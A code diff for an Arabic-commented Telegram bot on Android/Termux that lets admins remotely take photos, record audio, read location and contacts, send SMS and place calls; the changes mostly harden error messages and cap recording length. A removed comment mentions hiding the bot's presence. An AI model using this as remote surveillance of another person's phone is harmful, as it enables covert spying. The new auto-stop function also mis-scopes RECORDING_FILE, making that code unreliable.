@@ -151,17 +151,19 @@ def admin_only(func):
         try:
             return func(message, *args, **kwargs)
         except telebot.apihelper.ApiTelegramException as e:
-            # MODIFIED: عرض تفاصيل الخطأ بدلًا من رسالة مبهمة
+            # FIX: التفاصيل الكاملة في اللوج فقط — رسالة عامة للمستخدم (BOT_ERROR لا يُعاد إرساله عبر reply_to)
             logger.exception("خطأ في Telegram API أثناء معالجة الأمر: %s", e)
             try:
-                bot.reply_to(message, f"❌ خطأ Telegram API: {str(e)[:200]}")
+                if getattr(e, "error_code", None) != 429:
+                    bot.reply_to(message, "❌ حدث خطأ أثناء الاتصال بـ Telegram. راجع سجل البوت.")
             except Exception:
                 pass
         except Exception as e:
             # NEW: لا نبتلع الأخطاء غير المتوقعة بصمت
             logger.exception("خطأ غير متوقع في %s: %s", func.__name__, e)
             try:
-                bot.reply_to(message, f"❌ خطأ غير متوقع: {type(e).__name__}: {str(e)[:200]}")
+                # FIX: عدم كشف نص الاستثناء للمستخدم (قد يحوي مسارات/بيانات حساسة)
+                bot.reply_to(message, "❌ حدث خطأ غير متوقع. راجع سجل البوت.")
             except Exception:
                 pass
     return wrapper
@@ -342,7 +344,8 @@ def get_ip(message):
         logger.info("تم جلب IP للمستخدم %s", message.from_user.id)
     except Exception as e:
         logger.exception("فشل في جلب IP")
-        bot.reply_to(message, f"❌ تعذر جلب عنوان IP:\n{e}")
+        # FIX: التفاصيل في اللوج فقط
+        bot.reply_to(message, "❌ تعذر جلب عنوان IP. راجع سجل البوت.")
 
 # ================== /selfie و /photo ==================
 @bot.message_handler(commands=["selfie", "photo"])
@@ -488,6 +491,42 @@ def get_location(message):
     threading.Thread(target=fetch_gps_location, args=(message,), daemon=True).start()
 
 # ================== /record و /stop ==================
+RECORD_MAX_SECONDS = int(os.getenv("RECORD_MAX_SECONDS", "600"))  # حد أقصى افتراضي 10 دقائق
+
+def _auto_stop_recording():
+    """FIX: إيقاف تلقائي للتسجيل بعد RECORD_MAX_SECONDS لمنع التسجيل غير المحدود."""
+    deadline = time.monotonic() + RECORD_MAX_SECONDS
+    while time.monotonic() < deadline and not SHUTDOWN.is_set():
+        time.sleep(1)
+        with RECORDING_LOCK:
+            if RECORDING_FILE is None:
+                return  # تم إيقاف التسجيل يدوياً عبر /stop
+    if SHUTDOWN.is_set():
+        return
+    with RECORDING_LOCK:
+        path = RECORDING_FILE
+        RECORDING_FILE = None
+    if path is None:
+        return
+    logger.warning("تم إيقاف التسجيل تلقائياً بعد تجاوز الحد الأقصى (%d ثانية)", RECORD_MAX_SECONDS)
+    try:
+        subprocess.run(["termux-microphone-record", "-q"], capture_output=True, text=True, timeout=20)
+        time.sleep(1)
+        for admin_id in ADMIN_IDS:
+            if path.exists() and path.stat().st_size >= 100:
+                with open(path, "rb") as audio_file:
+                    bot.send_audio(admin_id, audio_file, title="تسجيل صوتي (إيقاف تلقائي)")
+            else:
+                safe_send(admin_id, "⏹️ تم إيقاف التسجيل تلقائياً بعد تجاوز الحد الأقصى المسموح.")
+    except Exception as e:
+        logger.exception("فشل الإيقاف التلقائي/إرسال التسجيل: %s", e)
+    finally:
+        try:
+            if path.exists():
+                path.unlink()
+        except OSError:
+            pass
+
 @bot.message_handler(commands=["record"])
 @admin_only
 def start_recording(message):
@@ -502,24 +541,30 @@ def start_recording(message):
 
         try:
             result = subprocess.run(
-                ["termux-microphone-record", "-f", str(file_path), "-l", "0", "-e", "aac"],
+                # FIX: تحديد مدة قصوى للتسجيل بدل -l 0 غير المحدود
+                ["termux-microphone-record", "-f", str(file_path), "-l", str(RECORD_MAX_SECONDS), "-e", "aac"],
                 capture_output=True,
                 text=True,
                 timeout=15
             )
             if result.returncode != 0:
                 detail = (result.stderr or result.stdout).strip()
-                bot.reply_to(message, "❌ تعذر بدء التسجيل.\n" + detail[:800])
+                # FIX: التفاصيل الكاملة تُسجَّل في اللوج فقط، ولا تُعرض للمستخدم
+                bot.reply_to(message, "❌ تعذر بدء التسجيل. تحقق من أذونات الميكروفون وTermux:API.")
                 logger.warning("فشل بدء التسجيل: %s", detail)
                 return
 
             RECORDING_FILE = file_path
-            bot.reply_to(message, "🎙️ بدأ التسجيل الصوتي.\nأرسل /stop لإيقافه وإرسال الملف.")
+            bot.reply_to(message,
+                         f"🎙️ بدأ التسجيل الصوتي.\nأرسل /stop لإيقافه وإرسال الملف.\n"
+                         f"(إيقاف تلقائي بعد {RECORD_MAX_SECONDS // 60} دقيقة كحد أقصى)")
             logger.info("بدأ تسجيل صوتي للمستخدم %s", message.from_user.id)
+            # FIX: مراقب للإيقاف التلقائي إذا لم يُرسَل /stop
+            threading.Thread(target=_auto_stop_recording, daemon=True).start()
         except Exception as e:
             RECORDING_FILE = None
             logger.exception("خطأ في بدء التسجيل")
-            bot.reply_to(message, f"❌ خطأ في بدء التسجيل: {e}")
+            bot.reply_to(message, "❌ حدث خطأ أثناء بدء التسجيل. راجع سجل البوت.")
 
 @bot.message_handler(commands=["stop"])
 @admin_only
@@ -544,7 +589,8 @@ def stop_recording(message):
         )
         if result.returncode != 0:
             detail = (result.stderr or result.stdout).strip()
-            bot.reply_to(message, "❌ تعذر إيقاف التسجيل بأمان.\n" + detail[:800])
+            # FIX: عدم كشف مخرجات النظام الخام للمستخدم
+            bot.reply_to(message, "❌ تعذر إيقاف التسجيل بأمان. راجع سجل البوت.")
             logger.warning("فشل إيقاف التسجيل: %s", detail)
             return
 
@@ -560,7 +606,7 @@ def stop_recording(message):
         logger.info("تم إرسال التسجيل الصوتي للمستخدم %s", message.from_user.id)
     except Exception as e:
         logger.exception("خطأ أثناء إيقاف التسجيل")
-        bot.reply_to(message, f"❌ حدث خطأ: {e}")
+        bot.reply_to(message, "❌ حدث خطأ أثناء إيقاف التسجيل. راجع سجل البوت.")
     finally:
         try:
             if path.exists():
@@ -593,7 +639,8 @@ def send_sms(message):
         )
         if result.returncode != 0:
             detail = (result.stderr or result.stdout).strip()
-            bot.reply_to(message, "❌ تعذر إرسال الرسالة SMS.\n" + detail[:800])
+            # FIX: التفاصيل في اللوج فقط، رسالة عامة للمستخدم
+            bot.reply_to(message, "❌ تعذر إرسال رسالة SMS. تحقق من أذونات Termux:API.")
             logger.warning("فشل إرسال SMS إلى %s: %s", phone_number, detail)
             return
 
@@ -604,10 +651,8 @@ def send_sms(message):
         logger.error("termux-sms-send غير موجود")
     except Exception as e:
         logger.exception("خطأ في إرسال SMS")
-        bot.reply_to(message, f"❌ حدث خطأ أثناء إرسال SMS:\n{e}")
+        bot.reply_to(message, "❌ حدث خطأ أثناء إرسال SMS. راجع سجل البوت.")
 
-# ================== التعامل مع الرسائل غير المعروفة ==================
-@bot.message_handler(content_types=["text"])
 # ================== /storage ==================
 @bot.message_handler(commands=["storage"])
 @admin_only
@@ -653,7 +698,97 @@ def get_storage_info(message):
         logger.info("تم جلب مساحة القرص للمستخدم %s", message.from_user.id)
     except Exception as e:
         logger.exception("خطأ في جلب مساحة القرص")
-        bot.reply_to(message, f"❌ حدث خطأ:\n{e}")
+        bot.reply_to(message, "❌ حدث خطأ أثناء جلب معلومات التخزين. راجع سجل البوت.")
+
+# ================== /cpu ==================
+@bot.message_handler(commands=["cpu"])
+@admin_only
+def get_cpu_info(message):
+    """FIX: تنفيذ أمر /cpu المفقود — عرض استخدام المعالج والذاكرة من /proc."""
+    try:
+        # --- حمل المعالج من /proc/loadavg ---
+        load1 = load5 = load15 = "N/A"
+        try:
+            with open("/proc/loadavg", "r") as f:
+                parts = f.read().split()
+                load1, load5, load15 = parts[0], parts[1], parts[2]
+        except OSError:
+            pass
+
+        cpu_count = os.cpu_count() or 1
+
+        # --- نسبة الاستخدام من فرق قراءتين في /proc/stat ---
+        cpu_percent = None
+        try:
+            def read_cpu_times():
+                with open("/proc/stat", "r") as f:
+                    fields = f.readline().split()[1:]
+                values = [int(x) for x in fields]
+                idle = values[3] + (values[4] if len(values) > 4 else 0)
+                total = sum(values)
+                return total, idle
+
+            t1, i1 = read_cpu_times()
+            time.sleep(0.5)
+            t2, i2 = read_cpu_times()
+            dt = t2 - t1
+            if dt > 0:
+                cpu_percent = (1 - (i2 - i1) / dt) * 100
+        except OSError:
+            pass
+
+        # --- الذاكرة من /proc/meminfo ---
+        mem_total_kb = mem_avail_kb = None
+        swap_total_kb = swap_free_kb = None
+        try:
+            with open("/proc/meminfo", "r") as f:
+                for line in f:
+                    key, _, val = line.partition(":")
+                    num = val.strip().split(" ")[0]
+                    if not num.isdigit():
+                        continue
+                    if key == "MemTotal":
+                        mem_total_kb = int(num)
+                    elif key == "MemAvailable":
+                        mem_avail_kb = int(num)
+                    elif key == "SwapTotal":
+                        swap_total_kb = int(num)
+                    elif key == "SwapFree":
+                        swap_free_kb = int(num)
+        except OSError:
+            pass
+
+        lines = ["🖥️ <b>حالة المعالج والذاكرة:</b>", ""]
+        cpu_line = f"- <b>الحمل (1/5/15 دقيقة):</b> {load1} / {load5} / {load15} ({cpu_count} نواة)"
+        if cpu_percent is not None:
+            cpu_line += f"\n- <b>استخدام المعالج:</b> {cpu_percent:.1f}%"
+        lines.append(cpu_line)
+
+        if mem_total_kb and mem_avail_kb is not None:
+            used_mb = (mem_total_kb - mem_avail_kb) / 1024
+            total_mb = mem_total_kb / 1024
+            pct = (used_mb / total_mb * 100) if total_mb else 0
+            lines.append(f"- <b>الذاكرة المستخدمة:</b> {used_mb:.0f} MB من {total_mb:.0f} MB ({pct:.1f}%)")
+        else:
+            lines.append("- <b>الذاكرة:</b> غير متاحة")
+
+        if swap_total_kb:
+            swap_used_mb = (swap_total_kb - (swap_free_kb or 0)) / 1024
+            lines.append(f"- <b>Swap:</b> {swap_used_mb:.0f} MB من {swap_total_kb / 1024:.0f} MB")
+
+        # --- عدد العمليات ---
+        try:
+            proc_count = sum(1 for p in Path("/proc").iterdir() if p.name.isdigit())
+            lines.append(f"- <b>عدد العمليات:</b> {proc_count}")
+        except OSError:
+            pass
+
+        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
+        logger.info("تم جلب معلومات المعالج للمستخدم %s", message.from_user.id)
+    except Exception as e:
+        logger.exception("خطأ في جلب معلومات المعالج")
+        bot.reply_to(message, "❌ حدث خطأ أثناء جلب معلومات المعالج. راجع سجل البوت.")
+
 # ================== /contacts =================
 @bot.message_handler(commands=["contacts"])
 @admin_only
@@ -672,11 +807,11 @@ def get_contacts(message):
             capture_output=True, text=True, timeout=30
         )
 
-        # 2. إذا فشل الأمر، أظهر الخطأ الحقيقي في تلجرام
+        # 2. إذا فشل الأمر، تُسجَّل التفاصيل في اللوج فقط (FIX: عدم كشف مخرجات النظام)
         if result.returncode != 0:
             detail = (result.stderr or result.stdout).strip()
-            bot.reply_to(message, f"❌ تعذر قراءة جهات الاتصال (كود {result.returncode}).\nالسبب:\n{detail[:800]}")
-            logger.warning("فشل termux-contact-list: %s", detail)
+            bot.reply_to(message, "❌ تعذر قراءة جهات الاتصال. تأكد من أذونات Termux:API.")
+            logger.warning("فشل termux-contact-list (كود %s): %s", result.returncode, detail)
             return
 
         if not result.stdout.strip():
@@ -685,9 +820,10 @@ def get_contacts(message):
 
         try:
             contacts = json.loads(result.stdout)
-        except json.JSONDecodeError as e:
-            bot.reply_to(message, f"❌ تعذر تحليل JSON.\nالناتج الخام:\n{result.stdout[:800]}")
-            logger.warning("JSON غير صالح من termux-contact-list")
+        except json.JSONDecodeError:
+            # FIX: لا نرسل الناتج الخام للمستخدم — يُسجَّل في اللوج فقط
+            bot.reply_to(message, "❌ تعذر تحليل بيانات جهات الاتصال. راجع سجل البوت.")
+            logger.warning("JSON غير صالح من termux-contact-list: %s", result.stdout[:800])
             return
 
         if not isinstance(contacts, list):
@@ -725,7 +861,8 @@ def get_contacts(message):
         logger.error("termux-contact-list غير موجود")
     except Exception as e:
         logger.exception("خطأ في جلب جهات الاتصال")
-        bot.reply_to(message, f"❌ حدث خطأ:\n{e}")
+        bot.reply_to(message, "❌ حدث خطأ أثناء جلب جهات الاتصال. راجع سجل البوت.")
+
 # ================== /call ==================
 @bot.message_handler(commands=["call"])
 @admin_only
@@ -748,7 +885,8 @@ def make_call(message):
         )
         if result.returncode != 0:
             detail = (result.stderr or result.stdout).strip()
-            bot.reply_to(message, "❌ تعذر إجراء المكالمة.\n" + detail[:800])
+            # FIX: التفاصيل في اللوج فقط، رسالة عامة للمستخدم
+            bot.reply_to(message, "❌ تعذر إجراء المكالمة. تحقق من أذونات Termux:API.")
             logger.warning("فشل termux-telephony-call إلى %s: %s", phone_number, detail)
             return
 
@@ -759,14 +897,18 @@ def make_call(message):
         logger.error("termux-telephony-call غير موجود")
     except Exception as e:
         logger.exception("خطأ في إجراء المكالمة")
-        bot.reply_to(message, f"❌ حدث خطأ:\n{e}")
+        bot.reply_to(message, "❌ حدث خطأ أثناء إجراء المكالمة. راجع سجل البوت.")
+
+# ================== التعامل مع الرسائل غير المعروفة ==================
+# FIX: الديكوريتر كان مفقوداً/في موضع خاطئ سابقاً — الآن مسجّل بشكل صحيح
+# ويأتي أخيراً ليلتقط فقط ما لم تلتقطه أوامر message_handler الأخرى
+@bot.message_handler(content_types=["text"])
+@admin_only
 def handle_unknown(message):
-    # NEW (fix 2): تجاهل صامت لغير المسؤول — يمنع كشف وجود البوت + log spam
-    if not is_admin(message):
-        return
     if message.text and message.text.startswith("/"):
         logger.info("أمر غير معروف: %s من المستخدم %s", message.text, message.from_user.id if message.from_user else "unknown")
         bot.reply_to(message, "❓ أمر غير معروف. أرسل /help لعرض القائمة.")
+    # الرسائل النصية العادية تُتجاهل (البوت أوامري فقط)
 
 # ================== تشغيل البوت ==================
 if __name__ == "__main__":
@@ -782,7 +924,9 @@ if __name__ == "__main__":
     print("البوت يعمل الآن...")
 
     try:
+        # FIX: إزالة التكرار — sms كان مكررًا، وإضافة start الناقصة
         bot.set_my_commands([
+            telebot.types.BotCommand("start", "بدء استخدام البوت وعرض الأوامر"),
             telebot.types.BotCommand("selfie", "تصوير بالكاميرا الأمامية"),
             telebot.types.BotCommand("photo", "تصوير بالكاميرا الخلفية"),
             telebot.types.BotCommand("battery", "معلومات البطارية"),
@@ -796,12 +940,10 @@ if __name__ == "__main__":
             telebot.types.BotCommand("status", "حالة البوت"),
             telebot.types.BotCommand("admins", "قائمة المسؤولين المعتمدين"),
             telebot.types.BotCommand("help", "إظهار قائمة الأوامر"),
-            telebot.types.BotCommand("sms", "إرسال رسالة SMS"),
-            telebot.types.BotCommand("storage", "مساحة القرص"),             # NEW
-            telebot.types.BotCommand("cpu", "استخدام المعالج والذاكرة"),    # NEW
-            telebot.types.BotCommand("contacts", "قائمة جهات الاتصال"),     # NEW
-            telebot.types.BotCommand("call", "إجراء مكالمة"),               # NEW
-
+            telebot.types.BotCommand("storage", "مساحة القرص"),
+            telebot.types.BotCommand("cpu", "استخدام المعالج والذاكرة"),
+            telebot.types.BotCommand("contacts", "قائمة جهات الاتصال"),
+            telebot.types.BotCommand("call", "إجراء مكالمة"),
         ])
     except Exception as e:
         logger.warning("تعذر تسجيل قائمة الأوامر: %s", e)
@@ -812,7 +954,8 @@ if __name__ == "__main__":
     backoff = 5
     while not SHUTDOWN.is_set():  # MODIFIED (fix 6): بدل while True
         try:
-            bot.infinity_polling(timeout=30, long_polling_timeout=20, skip_pending=True)
+            # FIX: كان skip_pending=True يتسبب في تجاهل اوامر معلقة اثناء انقطاع الاتصال
+            bot.infinity_polling(timeout=30, long_polling_timeout=20)
             backoff = 5
         except requests.exceptions.ReadTimeout:
             logger.warning("انتهت مهلة الاتصال، سيتم إعادة المحاولة.")
